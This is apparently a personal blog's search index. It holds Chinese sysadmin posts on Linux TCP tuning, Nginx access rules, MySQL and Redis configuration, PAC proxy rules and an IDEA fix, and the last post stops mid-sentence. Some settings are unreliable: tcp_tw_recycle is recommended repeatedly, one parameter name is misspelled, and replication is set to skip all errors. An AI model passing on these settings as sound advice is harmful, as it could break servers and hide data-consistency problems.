<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Linux 网络内核参数优化]]></title>
    <url>%2F2021%2F03%2FLinux%20%E7%BD%91%E7%BB%9C%E5%86%85%E6%A0%B8%E5%8F%82%E6%95%B0%E4%BC%98%E5%8C%96%2F</url>
    <content type="text"><![CDATA[前言在硬件资源有限的情况下，最大的压榨服务器的性能，提高服务器的并发处理能力，是很多运维技术人员思考的问题 TIME_WAITLinux系统下，TCP连接断开后，会以TIME_WAIT状态保留一定的时间，然后才会释放端口。当并发请求过多的时候，就会产生大量的TIME_WAIT状态的连接，无法及时断开的话，会占用大量的端口资源和服务器资源，可以优化TCP的内核参数，来及时将TIME_WAIT状态的端口清理掉。 查看当前TCP连接的状态和对应的连接数量： 1netstat -n | awk '/^tcp/ &#123;++S[$NF]&#125; END &#123;for(a in S) print a, S[a]&#125;' 输出类似下面的结果： 1234LAST_ACK 1ESTABLISHED 482FIN_WAIT1 4TIME_WAIT 1780 只用关心TIME_WAIT的个数，数量过大的话就有必要调整下Linux的TCP内核参数，让系统更快的释放TIME_WAIT连接 用vim打开配置文件： 1vim /etc/sysctl.conf 加入下面的内容： 12345678# 表示开启SYN Cookies。当出现SYN等待队列溢出时，启用cookies来处理，可防范少量SYN攻击，默认为0，表示关闭net.ipv4.tcp_syncookies = 1# 表示开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接，默认为0，表示关闭net.ipv4.tcp_tw_reuse = 1# 表示开启TCP连接中TIME-WAIT sockets的快速回收，默认为0，表示关闭net.ipv4.tcp_tw_recycle = 1# 修改系統默认的 TIMEOUT 时间net.ipv4.tcp_fin_timeout = 30 让内核参数生效： 1sysctl -p 经过这样的调整之后，除了会进一步提升服务器的负载能力之外，还能够防御小流量程度的DoS、CC和SYN攻击。 此外，如果连接数本身就很多，还可以再优化一下TCP的可使用端口范围，进一步提升服务器的并发能力。依然是往上面的参数文件中，加入下面这些配置： 12345678910111213# 这几个参数，建议只在流量非常大的服务器上开启，会有显著的效果。一般的流量小的服务器上，没有必要去设置这几个参数# 表示当keepalive起用的时候，TCP发送keepalive消息的频度。缺省是2小时，改为20分钟。net.ipv4.tcp_keepalive_time = 1200# 表示用于向外连接的端口范围。缺省情况下很小：32768到61000，改为10000到65000。（注意：这里不要将最低值设的太低，否则可能会占用掉正常的端口！）net.ipv4.ip_local_port_range = 10000 65000# 表示SYN队列的长度，默认为1024，加大队列长度为8192，可以容纳更多等待连接的网络连接数。net.ipv4.tcp_max_syn_backlog = 8192# 表示系统同时保持TIME_WAIT的最大数量，如果超过这个数字，TIME_WAIT将立刻被清除并打印警告信息。默 认为180000，改为6000。对于Apache、Nginx等服务器，上几行的参数可以很好地减少TIME_WAIT套接字数量，但是对于Squid，效果却不大。此项参数可以控制TIME_WAIT的最大数量，避免Squid服务器被大量的TIME_WAIT拖死。net.ipv4.tcp_max_tw_buckets = 5000 其他TCP参数说明12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455# 记录的那些尚未收到客户端确认信息的连接请求的最大值。对于有128M内存的系统而言，缺省值是1024，小内存的系统则是128。net.ipv4.tcp_max_syn_backlog = 65536# 每个网络接口接收数据包的速率比内核处理这些包的速率快时，允许送到队列的数据包的最大数目。net.core.netdev_max_backlog = 32768# web应用中listen函数的backlog默认会给我们内核参数的net.core.somaxconn限制到128，而nginx定义的NGX_LISTEN_BACKLOG默认为511，所以有必要调整这个值。net.core.somaxconn = 32768net.core.wmem_default = 8388608net.core.rmem_default = 8388608# 最大socket读buffer,可参考的优化值:873200net.core.rmem_max = 16777216# 最大socket写buffer,可参考的优化值:873200net.core.wmem_max = 16777216# 时间戳可以避免序列号的卷绕。一个1Gbps的链路肯定会遇到以前用过的序列号。时间戳能够让内核接受这种“异常”的数据包。这里需要将其关掉。net.ipv4.tcp_timestsmps = 0# 为了打开对端的连接，内核需要发送一个SYN并附带一个回应前面一个SYN的ACK。也就是所谓三次握手中的第二次握手。这个设置决定了内核放弃连接之前发送SYN+ACK包的数量。net.ipv4.tcp_synack_retries = 2# 在内核放弃建立连接之前发送SYN包的数量。net.ipv4.tcp_syn_retries = 2# 开启重用。允许将TIME-WAIT sockets重新用于新的TCP连接。#net.ipv4.tcp_tw_len = 1net.ipv4.tcp_tw_reuse = 1# TCP写buffer,可参考的优化值: 8192 436600 873200net.ipv4.tcp_wmem = 8192 436600 873200# TCP读buffer,可参考的优化值: 32768 436600 873200net.ipv4.tcp_rmem = 32768 436600 873200# 同样有3个值,意思是:# net.ipv4.tcp_mem[0]:低于此值，TCP没有内存压力。# net.ipv4.tcp_mem[1]:在此值下，进入内存压力阶段。# net.ipv4.tcp_mem[2]:高于此值，TCP拒绝分配socket。# 上述内存单位是页，而不是字节。可参考的优化值是:786432 1048576 1572864# 系统中最多有多少个TCP套接字不被关联到任何一个用户文件句柄上。# 如果超过这个数字，连接将即刻被复位并打印出警告信息。# 这个限制仅仅是为了防止简单的DoS攻击，不能过分依靠它或者人为地减小这个值，net.ipv4.tcp_max_orphans = 3276800# 更应该增加这个值(如果增加了内存之后)。# 如果套接字由本端要求关闭，这个参数决定了它保持在FIN-WAIT-2状态的时间。对端可以出错并永远不关闭连接，甚至意外当机。缺省值是60秒。2.2 内核的通常值是180秒，可以按这个设置，但要记住的是，即使机器是一个轻载的WEB服务器，也有因为大量的死套接字而内存溢出的风险，FIN- WAIT-2的危险性比FIN-WAIT-1要小，因为它最多只能吃掉1.5K内存，但是它们的生存期长些。net.ipv4.tcp_fin_timeout = 30#TCP快速打开（TCP Fast Open，TFO）是对TCP的一种简化握手手续的拓展，用于提高两端点间连接的打开速度net.ipv4.tcp_fastopen = 3 经过这样的优化配置之后，服务器的TCP并发处理能力会显著提高。以上配置仅供参考，用于生产环境请根据自己的实际情况。]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[IDEA无法正常启动]]></title>
    <url>%2F2020%2F11%2FIDEA%E6%97%A0%E6%B3%95%E6%AD%A3%E5%B8%B8%E5%90%AF%E5%8A%A8%2F</url>
    <content type="text"><![CDATA[前言以前都是用的破解版，今天想支持一下正版，到官网下载了最新版的IDEA，安装成功后发现无法正常启动，记录一下本次发现的坑 排查将 /Applications/IntelliJ IDEA.app/Contents/MacOS/idea 文件拖到命令行，观察日志输出 123Error opening zip file or JAR manifest missing : /Applications/IntelliJ IDEA.app/Contents/lib/jetbrains-agent.jarError occurred during initialization of VMagent library failed to init: instrument 通过错误得知，是该lib目录下缺少了一个文件，官网下载的包里是没有包含这个文件的所以无法读取 解决应该是以前下载的破解版导致的，破解版里面包含这个文件，官网的版本覆盖后这个文件就不存在了 找到 /Library/Application Support/JetBrains 目录 找到当前版本的目录，我的是 IntelliJIdea2020.2 打开 idea.vmoptions 文件，删除有关 jetbrains-agent.jar 文件的这一条 通过以上方法解决后，就可以顺利打开软件了，如果之前使用过破解版就可能有此类问题，如果不了解的话还是会浪费很多时间的]]></content>
      <categories>
        <category>开发环境</category>
      </categories>
      <tags>
        <tag>开发环境</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Mysql8修改事务隔离级别]]></title>
    <url>%2F2020%2F6%2FMysql8%E4%BF%AE%E6%94%B9%E4%BA%8B%E5%8A%A1%E9%9A%94%E7%A6%BB%E7%BA%A7%E5%88%AB%2F</url>
    <content type="text"><![CDATA[前言线上代码出现了bug，经查是mysql隔离级别引起的问题，将数据库隔离级别改为更适合线上业务的读提交 查看事务隔离级别MySQL8中隔离级别的变量跟之前的版本不一样，之前是tx_isolation，MySQL8改成了transaction_isolation 1mysql&gt; show variables like 'transaction%'; 或 1mysql&gt; select @@transaction_isolation; 修改事务隔离级别由低到高分别为 read uncommitted（读未提交） read committed（读提交） repeatable read（重复读） Serializable（序列化） 设置本次会话的事务隔离级别，只在本会话有效，不会影响到其它会话 1mysql&gt; set session transaction isolation level read committed; 设置全局的事务隔离级别，该设置不会影响当前已经连接的会话，新打开的会话，将使用新设置的事务隔离级别 1mysql&gt; set global transaction isolation level read committed; 设置下一次事务操作的隔离级别，该设置会随着下一次事务的提交而失效 重启后继续生效修改my.ini 123[mysqld]transaction-isolation = REPEATABLE-READtransaction-read-only = OFF]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关闭所有PHP Nginx Mysql进程]]></title>
    <url>%2F2020%2F5%2F%E5%85%B3%E9%97%AD%E6%89%80%E6%9C%89PHP%20Nginx%20Mysql%E8%BF%9B%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[前言有时需要关闭程序的所有进程 关闭PHP进程1kill $(ps aux | grep '[p]hp' | awk '&#123;print $2&#125;') 关闭Nginx进程1kill $(ps aux | grep '[n]ginx' | awk '&#123;print $2&#125;') 关闭Mysql进程1kill $(ps aux | grep '[m]ysql' | awk '&#123;print $2&#125;')]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[vue配置跨域代理]]></title>
    <url>%2F2020%2F4%2Fvue%E9%85%8D%E7%BD%AE%E8%B7%A8%E5%9F%9F%E4%BB%A3%E7%90%86%2F</url>
    <content type="text"><![CDATA[前言如果前端应用和后端 API 服务器没有运行在同一个主机上，需要在开发环境下将 API 请求代理到 API 服务器。这个问题可以通过 vue.config.js 中的 devServer.proxy 选项来配置。 vue.config.jsvue.config.js 是一个可选的配置文件，如果项目的 (和 package.json 同级的) 根目录中存在这个文件，那么它会被 @vue/cli-service 自动加载。你也可以使用 package.json 中的 vue 字段，但是注意这种写法需要你严格遵照 JSON 的格式来写。 这个文件应该导出一个包含了选项的对象 1234// vue.config.jsmodule.exports = &#123; // 选项...&#125; devServer.proxydevServer.proxy 可以是一个指向开发环境 API 服务器的字符串： 12345module.exports = &#123; devServer: &#123; proxy: 'http://localhost:4000' &#125;&#125; 这会告诉开发服务器将任何未知请求 (没有匹配到静态文件的请求) 代理到http://localhost:4000。 1234567891011121314151617module.exports = &#123; devServer: &#123; proxy: &#123; '/api': &#123; target: '&lt;url&gt;', ws: true, changeOrigin: true pathRewrite: &#123; '^/api': '' &#125; &#125;, '/foo': &#123; target: '&lt;other_url&gt;' &#125; &#125; &#125;&#125; 更多的代理控制行为，也可以使用一个 path: options 成对的对象。完整的选项可以查阅 http-proxy-middleware 。 总结以上均出自官方文档，发现很多人不知道看vue配置文档，百分之八十的问题都可以通过文档解决]]></content>
      <categories>
        <category>vue</category>
      </categories>
      <tags>
        <tag>vue</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nginx访问控制]]></title>
    <url>%2F2020%2F4%2FNginx%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6%2F</url>
    <content type="text"><![CDATA[前言有时，网站会被恶意入侵，可用Nginx做一些访问控制，加强一些网站安全性 扩展名限制禁止访问指定目录下的程序 1234location ~ ^/images/.*\.(php|py)$&#123; deny all;&#125; 禁止访问指定文件名程序 1234location ~ ^/data/(attachment|avatar).*\.(php|py)$&#123; deny all;&#125; 文件或目录限制123location ~ ^/(\.user.ini|\.htaccess|\.git|\.svn|\.project|LICENSE|README.md) &#123; return 404;&#125; 排除某个目录不受限制 123location ~ \.well-known&#123; allow all;&#125; 禁止访问单个目录 123location ~ ^/static &#123; deny all;&#125; 禁止访问多个目录，并返回指定状态码 123location ~ ^/(static|js) &#123; return 404;&#125; 限制IP访问禁止目录访问，但允许某IP访问 1234location ~ ^/mysql_loging/ &#123; allow 192.168.0.4; deny all;&#125; 限制IP或IP段访问 123456location / &#123; deny 192.168.0.4; allow 192.168.1.0/16; allow 10.0.0.0/24; deny all;&#125; nginx做反向代理的时候也可以限制客户端IP 1234567if ( $remoteaddr = 10.0.0.7 ) &#123; return 403;&#125;if ( $remoteaddr = 218.247.17.130 ) &#123; set $allow_access_root &apos;ture&apos;;&#125; 禁止某ip段访问并向浏览器输出一段文字（若有乱码,请在server中添加：charset utf-8;） 123if ($remote_addr ~* ^211\.149\.(.*?)\.(.*?)$)&#123;return 404 &quot;黑名单用户，拒绝访问&quot;;&#125; 禁止非法域名解析访问让使用IP访问网站的用户，或恶意接卸域名的用户，收到501错误 12345server &#123; listen 80 default_server; server_name _; return 501;&#125; 通过301跳转主页 12345server &#123; listen 80 default_server; server_name _; rewrite ^(.*) http://blog.dns.com/$1 permanent;&#125; 发现某域名恶意解析到公司的服务器IP，在server标签里添加以下代码即可，若有多个server要多处添加 123if ($host !~ ^www/.tag/.com$) &#123; rewrite ^(.*) http://blog.mydns.vip$1 permanent;&#125;]]></content>
      <categories>
        <category>nginx</category>
      </categories>
      <tags>
        <tag>nginx</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[平滑重启php-fpm]]></title>
    <url>%2F2020%2F4%2F%E5%B9%B3%E6%BB%91%E9%87%8D%E5%90%AFphp-fpm%2F</url>
    <content type="text"><![CDATA[前言php-fpm 会对下面几个信号作（自己的）处理 SIGINT, SIGTERM: immediate termination SIGQUIT: graceful stop SIGUSR1: re-open log file SIGUSR2: graceful reload of all workers + reload of fpm conf/binary 理解master进程可以理解以下信号 INT （2）, TERM（15） 立刻终止 QUIT （3） 平滑终止 USR1 重新打开日志文件 USR2 平滑重载所有worker进程并重新载入配置和二进制模块 查看进程数1ps aux | grep -c php-fpm 查看master进程号1ps aux|grep 'php-fpm: master' | awk '&#123;print $2&#125;' 平滑重启1kill -USR2 `cat /usr/local/php/var/run/php-fpm.pid` OR1kill -USR2 [pid] 脚本实现centos脚本实现12345678#!/bin/bashecho "php-fpm is reloading...."PID=`ps aux | grep php-fpm | grep "master" |awk '&#123;print $2&#125;'`[ $PID ] &amp;&amp; kill -USR2 $PID || echo "php-fpm is useing(pid=$PID)"echo "reload done!"echo "php-fpm is reload..."echo "reload done!"]]></content>
      <categories>
        <category>php</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis性能优化整理]]></title>
    <url>%2F2020%2F3%2FRedis%E6%80%A7%E8%83%BD%E4%BC%98%E5%8C%96%E6%95%B4%E7%90%86%2F</url>
    <content type="text"><![CDATA[前言Redis 是基于单线程模型实现的，也就是 Redis 是使用一个线程来处理所有的客户端请求的，尽管 Redis 使用了非阻塞式 IO，并且对各种命令都做了优化（大部分命令操作时间复杂度都是 O(1)），但由于 Redis 是单线程执行的特点，因此它对性能的要求更加苛刻。 开启 lazy free 特性lazy free 特性是 Redis 4.0 新增的一个非常使用的功能，它可以理解为惰性删除或延迟删除。意思是在删除的时候提供异步延时释放键值的功能，把键值释放操作放在 BIO(Background I/O) 单独的子线程处理中，以减少删除删除对 Redis 主线程的阻塞，可以有效地避免删除 big key 时带来的性能和可用性问题。 1234lazyfree-lazy-eviction nolazyfree-lazy-expire nolazyfree-lazy-server-del noslave-lazy-flush no lazyfree-lazy-eviction：表示当 Redis 运行内存超过 maxmeory 时，是否开启 lazy free 机制删除； lazyfree-lazy-expire：表示设置了过期时间的键值，当过期之后是否开启 lazy free 机制删除； lazyfree-lazy-server-del：有些指令在处理已存在的键时，会带有一个隐式的 del 键的操作，比如 rename 命令，当目标键已存在，Redis 会先删除目标键，如果这些目标键是一个 big key，就会造成阻塞删除的问题，此配置表示在这种场景中是否开启 lazy free 机制删除； slave-lazy-flush：针对 slave(从节点) 进行全量数据同步，slave 在加载 master 的 RDB 文件前，会运行 flushall 来清理自己的数据，它表示此时是否开启 lazy free 机制删除。 开启其中的 lazyfree-lazy-eviction、lazyfree-lazy-expire、lazyfree-lazy-server-del 等配置，这样就可以有效的提高主线程的执行效率。 使用 slowlog 优化耗时命令可以使用 slowlog 功能找出最耗时的 Redis 命令进行相关的优化，以提升 Redis 的运行速度，慢查询有两个重要的配置项： slowlog-log-slower-than ：用于设置慢查询的评定时间，也就是说超过此配置项的命令，将会被当成慢操作记录在慢查询日志中，它执行单位是微秒 (1 秒等于 1000000 微秒)； slowlog-max-len ：用来配置慢查询日志的最大记录数。 可以根据实际的业务情况进行相应的配置，其中慢日志是按照插入的顺序倒序存入慢查询日志中，可以使用 slowlog get n 来获取相关的慢查询日志，再找到这些慢查询对应的业务进行相关的优化。 使用 Pipeline 批量操作数据Pipeline (管道技术) 是客户端提供的一种批处理技术，用于一次处理多个 Redis 命令，从而提高整个交互的性能。 避免大量数据同时失效Redis 过期键值删除使用的是贪心策略，它每秒会进行 10 次过期扫描，此配置可在 redis.conf 进行配置，默认值是 hz 10，Redis 会随机抽取 20 个值，删除这 20 个键中过期的键，如果过期 key 的比例超过 25% ，重复执行此流程。 如果在大型系统中有大量缓存在同一时间同时过期，那么会导致 Redis 循环多次持续扫描删除过期字典，直到过期字典中过期键值被删除的比较稀疏为止，而在整个执行过程会导致 Redis 的读写出现明显的卡顿，卡顿的另一种原因是内存管理器需要频繁回收内存页，因此也会消耗一定的 CPU。为了避免这种卡顿现象的产生，我们需要预防大量的缓存在同一时刻一起过期，就简单的解决方案就是在过期时间的基础上添加一个指定范围的随机数。 连接池尽量使用 Redis 连接池，而不是频繁创建销毁 Redis 连接，这样就可以减少网络传输次数和减少了非必要调用指令。 限制 Redis 内存大小在 64 位操作系统中 Redis 的内存大小是没有限制的，也就是配置项 maxmemory &lt;bytes&gt; 是被注释掉的，这样就会导致在物理内存不足时，使用 swap 空间既交换空间，而当操心系统将 Redis 所用的内存分页移至 swap 空间时，将会阻塞 Redis 进程，导致 Redis 出现延迟，从而影响 Redis 的整体性能。 因此需要限制 Redis 的内存大小为一个固定的值，当 Redis 的运行到达此值时会触发内存淘汰策略，内存淘汰策略在 Redis 4.0 之后有 8 种： noeviction：不淘汰任何数据，当内存不足时，新增操作会报错，Redis 默认内存淘汰策略； allkeys-lru：淘汰整个键值中最久未使用的键值； allkeys-random：随机淘汰任意键值; volatile-lru：淘汰所有设置了过期时间的键值中最久未使用的键值； volatile-random：随机淘汰设置了过期时间的任意键值； volatile-ttl：优先淘汰更早过期的键值。 在 Redis 4.0 版本中又新增了 2 种淘汰策略： volatile-lfu：淘汰所有设置了过期时间的键值中，最少使用的键值； allkeys-lfu：淘汰整个键值中最少使用的键值。 其中 allkeys-xxx 表示从所有的键值中淘汰数据，而 volatile-xxx 表示从设置了过期键的键值中淘汰数据。可以根据实际的业务情况进行设置，默认的淘汰策略不淘汰任何数据，在新增时会报错。 混合持久化Redis 的持久化策略是将内存数据复制到硬盘上，这样才可以进行容灾恢复或者数据迁移，但维护此持久化的功能，需要很大的性能开销。在 Redis 4.0 之后，Redis 有 3 种持久化的方式： RDB（Redis DataBase，快照方式）将某一个时刻的内存数据，以二进制的方式写入磁盘； AOF（Append Only File，文件追加方式），记录所有的操作命令，并以文本的形式追加到文件中； 混合持久化方式，Redis 4.0 之后新增的方式，混合持久化是结合了 RDB 和 AOF 的优点，在写入的时候，先把当前的数据以 RDB 的形式写入文件的开头，再将后续的操作命令以 AOF 的格式存入文件，这样既能保证 Redis 重启时的速度，又能减低数据丢失的风险。 RDB 和 AOF 持久化各有利弊，RDB 可能会导致一定时间内的数据丢失，而 AOF 由于文件较大则会影响 Redis 的启动速度，为了能同时拥有 RDB 和 AOF 的优点，Redis 4.0 之后新增了混合持久化的方式，因此我们在必须要进行持久化操作时，应该选择混合持久化的方式。查询是否开启混合持久化可以使用 config get aof-use-rdb-preamble 命令 禁用 THP 特性Linux kernel 在 2.6.38 内核增加了 Transparent Huge Pages (THP) 特性 ，支持大内存页 2MB 分配，默认开启。当开启了 THP 时，fork 的速度会变慢，fork 之后每个内存页从原来 4KB 变为 2MB，会大幅增加重写期间父进程内存消耗。同时每次写命令引起的复制内存页单位放大了 512 倍，会拖慢写操作的执行时间，导致大量写操作慢查询。例如简单的 incr 命令也会出现在慢查询中，因此 Redis 建议将此特性进行禁用，禁用方法如下： 1echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled 为了使机器重启后 THP 配置依然生效，可以在 /etc/rc.local 中追加 echo never &gt; /sys/kernel/mm/transparent_hugepage/enabled。 使用分布式架构Redis 分布式架构有三个重要的手段： 主从同步 哨兵模式 Redis Cluster 集群 使用主从同步功能我们可以把写入放到主库上执行，把读功能转移到从服务上，因此就可以在单位时间内处理更多的请求，从而提升的 Redis 整体的运行速度。 而哨兵模式是对于主从功能的升级，但当主节点奔溃之后，无需人工干预就能自动恢复 Redis 的正常使用。 Redis Cluster 是 Redis 3.0 正式推出的，Redis 集群是通过将数据库分散存储到多个节点上来平衡各个节点的负载压力。 Redis Cluster 采用虚拟哈希槽分区，所有的键根据哈希函数映射到 0 ~ 16383 整数槽内，计算公式：slot = CRC16(key) &amp; 16383，每一个节点负责维护一部分槽以及槽所映射的键值数据。这样 Redis 就可以把读写压力从一台服务器，分散给多台服务器了，因此性能会有很大的提升。 在这三个功能中，只需要使用一个就行了，毫无疑问 Redis Cluster 应该是首选的实现方案，它可以把读写压力自动的分担给更多的服务器，并且拥有自动容灾的能力。]]></content>
      <categories>
        <category>redis</category>
      </categories>
      <tags>
        <tag>redis</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[设置CentOS服务器IP地址]]></title>
    <url>%2F2020%2F2%2F%E8%AE%BE%E7%BD%AECentOS%E6%9C%8D%E5%8A%A1%E5%99%A8IP%E5%9C%B0%E5%9D%80%2F</url>
    <content type="text"><![CDATA[前言如何在CentOS服务器中配置网络IP地址 设置IP地址1cd /etc/sysconfig/network-scripts/ 查看配置信息 1ifconfig 编辑网卡配置 1vim ifcfg-eno1 编辑信息，建议 ONBOOT=yes，以后开机就会自动联网： 1234567891011121314151617181920212223TYPE="Ethernet"BOOTPROTO="none"DEFROUTE="yes"IPV4_FAILURE_FATAL="no"IPV6INIT="yes"IPV6_AUTOCONF="yes"IPV6_DEFROUTE="yes"IPV6_FAILURE_FATAL="no"NAME="eno1"UUID="c63850e5-4c25-46c7-a030-574fcf824ad5"DEVICE="eno1" #设备别名ONBOOT="yes"IPADDR1=202.95.22.222 #从IP地址1PREFIX1="25"IPADDR2=202.95.22.233 #从IP地址2PREFIX2="25"DNS1="8.8.8.8" #DNS服务器IPADDR=202.95.22.212 #设置主IP地址PREFIX=25GATEWAY=202.95.8.129 #网关IPV6_PEERDNS=yesIPV6_PEERROUTES=yesIPV6_PRIVACY=no 重启网络配置1systemctl restart network]]></content>
      <categories>
        <category>linux</category>
      </categories>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PAC规则配置]]></title>
    <url>%2F2020%2F2%2FPAC%E8%A7%84%E5%88%99%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[前言访问github加载过慢，下载项目奇慢无比，开启全局后可以秒下，反应过来github.com默认没有走代理，整理了一些PAC规则的基本配置 基本规则 通配符支持，如 *.example.com/* 实际书写时可省略 如： .example.com/ 意即 .example.com/* 正则表达式支持，以 \ 开始和结束， 如： \[\w]+:\/\/example.com\ 例外规则 @@，如 @@*.example.com/* 满足 @@ 后规则的地址不使用代理 匹配地址开始和结尾 |，如： |http://example.com、example.com| 分别表示以 http://example.com 开始和以 example.com 结束的地址 || 标记，如： ||example.com 则 http://example.com 、https://example.com 、ftp://example.com 等地址均满足条件，只用于匹配地址开头 注释 ! 如： ! Comment 分隔符 ^，表示除了字母、数字或者 _ - . % 之外的任何字符如： http://example.com^ ，http://example.com/ 和 http://example.com:8000/ 均满足条件，而 http://example.com.ar/ 不满足条件 自定义规则1234567! Put user rules line by line in this file.! See https://adblockplus.org/en/filter-cheatsheet@@||localhost||github.com 一行只能有一条代理规则，生效后被配置的域名及其子域名都会经过代理访问]]></content>
      <categories>
        <category>科学上网</category>
      </categories>
      <tags>
        <tag>ssr</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[阿里云RDS与ECS服务器数据库做主从]]></title>
    <url>%2F2020%2F2%2F%E9%98%BF%E9%87%8C%E4%BA%91RDS%E4%B8%8EECS%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%95%B0%E6%8D%AE%E5%BA%93%E5%81%9A%E4%B8%BB%E4%BB%8E%2F</url>
    <content type="text"><![CDATA[前言实现RDS for mysql与线下ECS上自建数据库数据实时同步，阿里云官方推荐使用DTS方式进行。原因有两个： mysql-bin正常情况下,RDS在本地只保存18个小时 当RDS实例切换时，会影响自建ECS数据同步(这个经过测试可以排除) 考虑到使用DTS工具会产生不少的费用(长期使用)，另一方面，在数据库中一个地区对应一个库，后续业务无法事先规划好库名，此时如果使用dts可能需要购买多个通道，进行配置，比较费时费力且费钱。基于这两个原因的考虑，决定使用搭建主从复制方式来实现数据同步 基础概念传统的MYSQL主从就是主库每做一个操作会在binlog上做一个position，每做一个event就在binlog做一个起始编号、一个终止编号。然后主库把binlog传递给从库，然后从库根据这个binlog的pos值就按照顺序做一样的操作，达到两个数据库保持一致的目的。 GTID不用这个position的方式，而是用了全局事物标识，这个标识的格式是source_id:transaction_id，如3E11FA47-71CA-11E1-9E33-C80AA9429562:23 source_id即是server_uuid，在第一次启动时生成(函数 generate_server_uuid)，并持久化到DATADIR/auto.cnf文件里 transaction_id是顺序化的序列号(sequence number)，在每台 MySQL 服务器上都是从 1 开始自增长的序列，是事务的唯一标识 它的主从过程是这样的：主库更新数据时，会在事务前产生GTID，连通sql记录到binlog日志中。从库的i/o线程将变更的binlog写入到relay log中，读取值是根据gitd_next变量，告诉从库下一个执行哪个GTID。从库的sql线程从relay log中获取GTID，然后对比从库的的binlog是否有记录。如果有记录，说明该GTID的事务已经执行，从库会忽略。如果没有记录，从库就会从relay log中执行该GTID的事务，并记录到从库binlog。在解析过程中会判断是否有主键，如果没有就用二级索引，如果没有二级索引就用全部扫描。 也就是说，无论是级联情况，还是一主多从情况，都可以通过GTID自动找点儿，而无需像之前那样通过binlog和binlog_position找点儿了 RDS数据库配置 配置从实例读取数据使用的只读账号和授权数据库 将ECS的从实例的 IP 地址加入主实例的 IP 白名单中 登录主实例 查询 server-id1mysql&gt; show variables like &apos;server_id&apos;; 查询 GTID1mysql&gt; show global variables like &apos;gtid_purged&apos;; ECS数据库配置mysql文件配置12345678910server-id = 1001 #不可与RDS主库id相同port = 3306replicate-do-db = masterdb #需要同步的数据库binlog_format = row #日志文件格式log-bin = mysql-binlog-bin-index = mysql-bin.indexrelay-log = relay-logrelay_log_index = relay-log.indexslave-skip-errors = all GTID配置12345gtid_mode = onenforce_gtid_consistency = onlog-slave-updates = 1sql_mode = NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES 从库配置12mysql&gt; stop slave;mysql&gt; set global gtid_purged = &apos;533ac4e6-9565-11e8-abb5-7cd30abca02e:1-3099396&apos;; 注意：设置gtid_purged值时，gtid_executed值必须为空否则报错，该值清空的方法就是reset master命令 1mysql&gt;reset master; 执行同步12345678CHANGE MASTER TOMASTER_HOST=&apos;xxxxxxx.mysql.rds.aliyuncs.com&apos;,MASTER_PORT=3306,MASTER_USER=&apos;username&apos;,MASTER_PASSWORD=&apos;password&apos;,master_auto_position=1;mysql&gt;start slave; 查看从库状态1mysql&gt;show slave status\G; 两个yes表示成功 12Slave_IO_Running: YesSlave_SQL_Running: Yes]]></content>
      <categories>
        <category>mysql</category>
      </categories>
      <tags>
        <tag>mysql</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Redis由于连接过多导致的异常]]></title>
    <url>%2F2019%2F12%2FRedis%E7%94%B1%E4%BA%8E%E8%BF%9E%E6%8E%A5%E8%BF%87%E5%A4%9A%E5%AF%BC%E8%87%B4%E7%9A%84%E5%BC%82%E5%B8%B8%2F</url>
    <content type="text"><![CDATA[前言近期服务器在高峰的时候经常报错，日志记录为： 1234Redis-&gt;connect(&apos;127.0.0.1&apos;, 6379)#1 &#123;main&#125; thrown in /wwwroot/test.php on line 9[13-Jun-2019 11:07:47 PRC] PHP Fatal error: Uncaught RedisException: Cannot assign requested address in /wwwroot/test.php:9 解决方法方法一执行命令修改如下 2 个内核参数 1234567sysctl -w net.ipv4.tcp_timestamps=1 开启对于 TCP 时间戳的支持, 若该项设置为 0，则下面一项设置不起作用sysctl -w net.ipv4.tcp_tw_recycle=1 表示开启 TCP 连接中 TIME-WAIT sockets 的快速回收Redis 错误 ：Cannot assign requestCould not connect to Redis at 127.0.0.1:6379: connect: Cannot assign request 经查官方 Wiki 是系统网络配置问题已经解决： 1echo 1 &gt; /proc/sys/net/ipv4/tcp_tw_reuse 以上需要 root 权限对网络进行配置。 方法二通过调整内核参数解决，vim /etc/sysctl.conf，加入 123456789net.ipv4.tcp_syncookies = 1 #表示开启 SYN Cookies。当出现 SYN 等待队列溢出时，启用 cookies 来处理，可防范少量 SYN 攻击，默认为 0，表示关闭；net.ipv4.tcp_tw_reuse = 1 #表示开启重用。允许将 TIME-WAIT sockets 重新用于新的 TCP 连接，默认为 0，表示关闭，释放 TIME_WAIT 端口给新连接使用；net.ipv4.tcp_tw_recycle = 1 #表示开启 TCP 连接中 TIME-WAIT sockets 的快速回收资源，默认为 0，表示关闭。net.ipv4.tcp_fin_timeout = 30 #修改系統默认的 TIMEOUT 时间，调低端口释放后的等待时间，默认为 60s，修改为 15~30snet.ipv4.tcp_max_tw_buckets = 10000# 通过设置它，系统会将多余的 TIME_WAIT 删除掉，此时系统日志里可能会显示：『TCP: time wait bucket table overflow』，多数情况下不用在意这些信息。 然后执行 /sbin/sysctl -p 让参数生效。 以上都可以通过命令（sysctl -w）方式操作，如：sysctl -w net.ipv4.tcp_fin_timeout=30 ，只适合临时修改参数。 TCP 网络参数优化123456789101112131415161718192021222324252627282930313233echo "1024 65535" &gt; /proc/sys/net/ipv4/ip_local_port_range 设置向外连接可用端口范围 表示可以使用的端口为 